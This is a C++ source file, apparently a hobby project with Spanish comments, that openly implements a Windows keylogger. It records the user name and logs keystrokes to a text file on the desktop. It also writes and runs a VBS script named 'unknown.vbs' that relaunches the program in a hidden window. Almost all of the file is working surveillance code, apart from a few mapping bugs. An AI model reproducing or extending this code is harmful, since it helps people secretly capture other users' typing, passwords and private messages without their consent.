// keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//  std::cout.rdbuf(originalBuffer)  Restaura el buffer..

#include <iostream> //i/o.
#include <fstream> //Buffer.
#include <conio.h> //getch()
#include <unordered_map> //HashTables.
#include <string>   //Strings
#include <sstream>
#include <functional>  //Lambda.
#include <windows.h>
#include <locale>
#include <codecvt> //String conversion.
#include <format>

/*
    Definición de todas las teclas.
*/


#define KEY_BACKSPACE 8
#define KEY_ESCAPE 27
#define KEY_SPACE 32
#define KEY_EXCLAMATION 33
#define KEY_QUOTES 34
#define KEY_HASH 35
#define KEY_DOLLAR 36
#define KEY_PERCENT 37
#define KEY_AMPERSAN 38
#define KEY_SIMPLE_QUOTE 39
#define KEY_OPEN_PARENTHESIS 40
#define KEY_CLOSE_PARENTHESIS 41
#define KEY_CHAR 42
#define KEY_PLUS 43
#define KEY_COMMA 44
#define KEY_MINUS 45
#define KEY_DOT 46
#define KEY_SLASH 47
#define KEY_NUMBER0 48
#define KEY_NUMBER1 49
#define KEY_NUMBER2 50
#define KEY_NUMBER3 51
#define KEY_NUMBER4 52
#define KEY_NUMBER5 53
#define KEY_NUMBER6 54
#define KEY_NUMBER7 55
#define KEY_NUMBER8 56
#define KEY_NUMBER9 57
#define KEY_DOUBLE_DOT 58
#define KEY_DOTCOMMA 59
#define KEY_LESS 60
#define KEY_EQUAL 61
#define KEY_GREATER 62
#define KEY_CLOSE_QUESTIONMARK 63
#define KEY_AT 64
#define KEY_CAPITALLETTER_A 65
#define KEY_CAPITALLETTER_B 66
#define KEY_CAPITALLETTER_C 67
#define KEY_CAPITALLETTER_D 68
#define KEY_CAPITALLETTER_E 69
#define KEY_CAPITALLETTER_F 70
#define KEY_CAPITALLETTER_G 71
#define KEY_CAPITALLETTER_H 72
#define KEY_CAPITALLETTER_I 73
#define KEY_CAPITALLETTER_J 74
#define KEY_CAPITALLETTER_K 75
#define KEY_CAPITALLETTER_L 76
#define KEY_CAPITALLETTER_M 77
#define KEY_CAPITALLETTER_N 78
#define KEY_CAPITALLETTER_O 79
#define KEY_CAPITALLETTER_P 80
#define KEY_CAPITALLETTER_Q 81
#define KEY_CAPITALLETTER_R 82
#define KEY_CAPITALLETTER_S 83
#define KEY_CAPITALLETTER_T 84
#define KEY_CAPITALLETTER_U 85
#define KEY_CAPITALLETTER_V 86
#define KEY_CAPITALLETTER_W 87
#define KEY_CAPITALLETTER_X 88
#define KEY_CAPITALLETTER_Y 89
#define KEY_CAPITALLETTER_Z 90
#define KEY_OPEN_BRACKET 91
#define KEY_BACKSLASH 92
#define KEY_CLOSE_BRACKET 93
#define KEY_UPARROW_CHAR 94
#define KEY_LOWLINE 95
#define KEY_LEFT_ACCENTUATION 96
#define KEY_A 97
#define KEY_B 98
#define KEY_C 99
#define KEY_D 100
#define KEY_E 101
#define KEY_F 102
#define KEY_G 103
#define KEY_H 104
#define KEY_I 105
#define KEY_J 106
#define KEY_K 107
#define KEY_L 108
#define KEY_M 109
#define KEY_N 110
#define KEY_O 111
#define KEY_P 112
#define KEY_Q 113
#define KEY_R 114
#define KEY_S 115
#define KEY_T 116
#define KEY_U 117
#define KEY_V 118
#define KEY_W 119
#define KEY_X 120
#define KEY_Y 121
#define KEY_Z 122
#define KEY_OPEN_KEYS 123
#define KEY_CENTRAL_SLASH 124
#define KEY_CLOSE_KEYS 125
#define KEY_EYE 126
#define KEY_DEL 127
#define KEY_CEDILLA 128
#define KEY_OPEN_QUESTIONMARK 168
#define KEY_DEGREE 248

/*
    Función para obtener la ruta de la aplicación.
    SearchPath busca el nombre de la aplicación específicada a traves de el entorno "SYSTEM PATH ENVIRONMENT".
    Buffer[MAX_PATH] = Almacena la longitud de la ruta del ejecutable.
    c_str() = Retorna un puntero que sirve para representar "\0" , el cual determina el fin de la cadena de caracteres al estilo "C-String".
   */

std::wstring GetApplicationPath(const std::wstring& appName) {
    
    wchar_t buffer[MAX_PATH];


    DWORD result = SearchPath(NULL, appName.c_str(), NULL, MAX_PATH, buffer, NULL);

    if (result != 0 && result < MAX_PATH) {
        return std::wstring(buffer);
    }
    else {
        return L""; //wstring
    }
}


int main() {

    //AppName = Nombre del archivo a buscar por la función "GetApplicationPath()" + Validación.
    std::wstring appName = L"keylogger.exe";

    std::wstring appPath = GetApplicationPath(appName);

    if (!appPath.empty()) {
        std::wcout << L"The installation path of " << appName << L" is: " << appPath << std::endl; //wstring<< buffer.
    }
    else {
        std::cerr << L"Failed to find the application." << std::endl; //Unbuffer <<cout.
    }

    //Definición de la tabla de Hash.
    std::unordered_map<int, std::function<void()>> hashTable;

    TCHAR userName[MAX_PATH]; // MAXPATH (FORMATO UNICODE & ANSI)
    DWORD size = sizeof(userName) / sizeof(userName[0]); //Size = userName[] Chars.  []=Array.

    GetUserName(userName, &size); //Funcion que recupera el nombre de usuario. &Size determina la longitud de caracteres a copiar por la función.

 
    std::wstring wideUserName(userName); /* Char array > wstring (unicode)*/
   
    std::string narrowUserName(wideUserName.begin(), wideUserName.end()); /*wstring > narrowstring (1 char = byte.)*/
 
    std::string defaultDesktop = "C:\\Users\\" + narrowUserName + "\\Desktop\\";
    

    
    std::cout << "Keylogger loaded.\n ";
   

    std::ofstream outputFile(defaultDesktop + "keylogger.txt");
    std::streambuf* originalBuffer = std::cout.rdbuf();

    std::cout << "File opened and all the buffer inputs are being redirected to the file.. \n";

    /*
    Se le asigna una ruta y dirección al archivo .vbs ; Se redirecciona el buffer al archivo para proceder a su escritura y por ultimo 
    */
    std::ofstream vbsFile(defaultDesktop + "unknown.vbs");
    
    if (!vbsFile) {
        std::cerr << "Failed to open file for writing." << std::endl;
        return 1;
    }
    else
    {
        std::cout << "VBS file created.";
    }

    /*
    Código que va a almacenar el archivo .vbs
    */

    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    std::string narrowAppPath = converter.to_bytes(appPath);

    vbsFile << "Set WshShell = CreateObject(\"WScript.Shell\")" << std::endl;
    vbsFile << "WshShell.Run chr(34) & \"" << narrowAppPath << "\" & chr(34), 0" << std::endl;
    vbsFile << "Set WshShell = Nothing" << std::endl;

   

    /*
       Se cierra el archivo .vbs y se redirecciona el buffer de "std::cout" al archivo .txt.
    */
    vbsFile.close();

    std::wstring_convert<std::codecvt_utf8<wchar_t>> utf8toWchar;
    std::wstring username = utf8toWchar.from_bytes(narrowUserName);
    const wchar_t* desktopPath = L"C:\\Users\\";

    wchar_t fullPath[MAX_PATH];
    swprintf_s(fullPath, MAX_PATH, L"%s%s\\Desktop\\unknown.vbs", desktopPath, username);

    HINSTANCE result = ShellExecute(nullptr, L"open", fullPath, nullptr, nullptr, SW_SHOWNORMAL);
    std::cout.rdbuf(outputFile.rdbuf());

    
    
    /*
      Definición de la Tabla de Hash que contiene todas las teclas disponibles para almacenar en el .txt.
    */

    hashTable[KEY_BACKSPACE] = []() {
        std::cout << "<-";
        };

    hashTable[KEY_ESCAPE] = []() {
        std::cout << "Esc";
        };

    hashTable[KEY_SPACE] = []() {
        std::cout << "Space";
        };

    hashTable[KEY_EXCLAMATION] = []() {
        std::cout << "!";
        };

    hashTable[KEY_QUOTES] = []() {
        std::cout << """";
        };

    hashTable[KEY_HASH] = []() {
        std::cout << "#";
        };

    hashTable[KEY_DOLLAR] = []() {
        std::cout << "$";
        };

    hashTable[KEY_PERCENT] = []() {
        std::cout << "%";
        };

    hashTable[KEY_AMPERSAN] = []() {
        std::cout << "&";
        };

    hashTable[KEY_SIMPLE_QUOTE] = []() {
        std::cout << "'";
        };

    hashTable[KEY_OPEN_PARENTHESIS] = []() {
        std::cout << "{";
        };

    hashTable[KEY_CLOSE_PARENTHESIS] = []() {
        std::cout << "}";
        };

    hashTable[KEY_CHAR] = []() {
        std::cout << "*";
        };

    hashTable[KEY_PLUS] = []() {
        std::cout << "+";
        };

    hashTable[KEY_COMMA] = []() {
        std::cout << ",";
        };

    hashTable[KEY_MINUS] = []() {
        std::cout << "-";
        };

    hashTable[KEY_DOT] = []() {
        std::cout << ".";
        };

    hashTable[KEY_SLASH] = []() {
        std::cout << "/";
        };

    hashTable[KEY_NUMBER0] = []() {
        std::cout << "0";
        };

    hashTable[KEY_NUMBER1] = []() {
        std::cout << "1";
        };

    hashTable[KEY_NUMBER2] = []() {
        std::cout << "2";
        };

    hashTable[KEY_NUMBER3] = []() {
        std::cout << "3";
        };

    hashTable[KEY_NUMBER4] = []() {
        std::cout << "4";
        };

    hashTable[KEY_NUMBER5] = []() {
        std::cout << "5";
        };

    hashTable[KEY_NUMBER6] = []() {
        std::cout << "6";
        };

    hashTable[KEY_NUMBER7] = []() {
        std::cout << "7";
        };

    hashTable[KEY_NUMBER8] = []() {
        std::cout << "8";
        };

    hashTable[KEY_NUMBER9] = []() {
        std::cout << "9";
        };

    hashTable[KEY_DOUBLE_DOT] = []() {
        std::cout << ":";
        };

    hashTable[KEY_DOTCOMMA] = []() {
        std::cout << ";";
        };

    hashTable[KEY_LESS] = []() {
        std::cout << "<";
        };

    hashTable[KEY_EQUAL] = []() {
        std::cout << "=";
        };

    hashTable[KEY_GREATER] = []() {
        std::cout << ">";
        };

    hashTable[KEY_CLOSE_QUESTIONMARK] = []() {
        std::cout << "?";
        };

    hashTable[KEY_AT] = []() {
        std::cout << "@";
        };

    hashTable[KEY_CAPITALLETTER_A] = []() {
        std::cout << "A";
        };

    hashTable[KEY_CAPITALLETTER_B] = []() {
        std::cout << "B";
        };

    hashTable[KEY_CAPITALLETTER_C] = []() {
        std::cout << "C";
        };

    hashTable[KEY_CAPITALLETTER_D] = []() {
        std::cout << "D";
        };

    hashTable[KEY_CAPITALLETTER_E] = []() {
        std::cout << "E";
        };

    hashTable[KEY_CAPITALLETTER_F] = []() {
        std::cout << "F";
        };

    hashTable[KEY_CAPITALLETTER_G] = []() {
        std::cout << "G";
        };

    hashTable[KEY_CAPITALLETTER_H] = []() {
        std::cout << "H";
        };

    hashTable[KEY_CAPITALLETTER_I] = []() {
        std::cout << "I";
        };

    hashTable[KEY_CAPITALLETTER_J] = []() {
        std::cout << "J";
        };

    hashTable[KEY_CAPITALLETTER_K] = []() {
        std::cout << "K";
        };

    hashTable[KEY_CAPITALLETTER_L] = []() {
        std::cout << "L";
        };

    hashTable[KEY_CAPITALLETTER_M] = []() {
        std::cout << "M";
        };

    hashTable[KEY_CAPITALLETTER_N] = []() {
        std::cout << "N";
        };

    hashTable[KEY_CAPITALLETTER_O] = []() {
        std::cout << "O";
        };

    hashTable[KEY_CAPITALLETTER_P] = []() {
        std::cout << "P";
        };

    hashTable[KEY_CAPITALLETTER_Q] = []() {
        std::cout << "Q";
        };

    hashTable[KEY_CAPITALLETTER_R] = []() {
        std::cout << "R";
        };

    hashTable[KEY_CAPITALLETTER_S] = []() {
        std::cout << "S";
        };

    hashTable[KEY_CAPITALLETTER_T] = []() {
        std::cout << "T";
        };

    hashTable[KEY_CAPITALLETTER_U] = []() {
        std::cout << "U";
        };

    hashTable[KEY_CAPITALLETTER_V] = []() {
        std::cout << "V";
        };

    hashTable[KEY_CAPITALLETTER_W] = []() {
        std::cout << "W";
        };

    hashTable[KEY_CAPITALLETTER_X] = []() {
        std::cout << "X";
        };

    hashTable[KEY_CAPITALLETTER_Y] = []() {
        std::cout << "Y";
        };

    hashTable[KEY_CAPITALLETTER_Z] = []() {
        std::cout << "Z";
        };

    hashTable[KEY_OPEN_BRACKET] = []() {
        std::cout << "[";
        };

    hashTable[KEY_BACKSLASH] = []() {
        std::cout << "backslash";
        };

    hashTable[KEY_CLOSE_BRACKET] = []() {
        std::cout << "]";
        };

    hashTable[KEY_LOWLINE] = []() {
        std::cout << "_";
        };

    hashTable[KEY_LEFT_ACCENTUATION] = []() {
        std::cout << "LeftAccentuation";
        };

    hashTable[KEY_A] = []() {
        std::cout << "a";
        };

    hashTable[KEY_B] = []() {
        std::cout << "b";
        };

    hashTable[KEY_C] = []() {
        std::cout << "c";
        };

    hashTable[KEY_D] = []() {
        std::cout << "d";
        };

    hashTable[KEY_E] = []() {
        std::cout << "e";
        };

    hashTable[KEY_F] = []() {
        std::cout << "f";
        };

    hashTable[KEY_G] = []() {
        std::cout << "g";
        };

    hashTable[KEY_H] = []() {
        std::cout << "h";
        };

    hashTable[KEY_I] = []() {
        std::cout << "i";
        };

    hashTable[KEY_J] = []() {
        std::cout << "j";
        };

    hashTable[KEY_K] = []() {
        std::cout << "k";
        };

    hashTable[KEY_L] = []() {
        std::cout << "l";
        };

    hashTable[KEY_M] = []() {
        std::cout << "m";
        };

    hashTable[KEY_N] = []() {
        std::cout << "n";
        };

    hashTable[KEY_O] = []() {
        std::cout << "o";
        };

    hashTable[KEY_P] = []() {
        std::cout << "p";
        };

    hashTable[KEY_Q] = []() {
        std::cout << "q";
        };

    hashTable[KEY_R] = []() {
        std::cout << "r";
        };

    hashTable[KEY_S] = []() {
        std::cout << "s";
        };

    hashTable[KEY_T] = []() {
        std::cout << "t";
        };

    hashTable[KEY_U] = []() {
        std::cout << "u";
        };

    hashTable[KEY_V] = []() {
        std::cout << "v";
        };

    hashTable[KEY_W] = []() {
        std::cout << "w";
        };

    hashTable[KEY_X] = []() {
        std::cout << "x";
        };

    hashTable[KEY_Y] = []() {
        std::cout << "y";
        };

    hashTable[KEY_Z] = []() {
        std::cout << "z";
        };

    hashTable[KEY_OPEN_KEYS] = []() {
        std::cout << "{";
        };

    hashTable[KEY_CENTRAL_SLASH] = []() {
        std::cout << "|";
        };

    hashTable[KEY_CLOSE_KEYS] = []() {
        std::cout << "}";
        };

    hashTable[KEY_EYE] = []() {
        std::cout << "~";
        };

    hashTable[KEY_DEL] = []() {
        std::cout << "Del";
        };

    hashTable[KEY_CEDILLA] = []() {
        std::cout << "Cedilla";
        };

    hashTable[KEY_DEGREE] = []() {
        std::cout << "°";
        };

    hashTable[KEY_UPARROW_CHAR] = []() {
        std::cout << "UpArrowChar";
        };

    hashTable[KEY_OPEN_QUESTIONMARK] = []() {
        std::cout << "¿";
        };

    int key;
    std::cout << "Usuario: " + narrowUserName + "\n";
    std::cout << "Leyendo inputs: \n";
    while (true) {
        key = _getch();

        if (hashTable.find(key) != hashTable.end()) {
            hashTable[key]();
        }
        else {
            std::cout << "Invalid key." << std::endl;  
        }
    }

    /*
    * 
    * Para agregar:
    *  - Trabajo en segundo plano. ********Hecho********.
    *  - Separar la tabla de hash a otro .cpp y instanciarlo en keylogger.cpp
    *  - Buscar el path de instalación del programa para utilizarlo y ejecutar el .vbs *****Hecho*********
    *  - 
    */

    return 0;
}
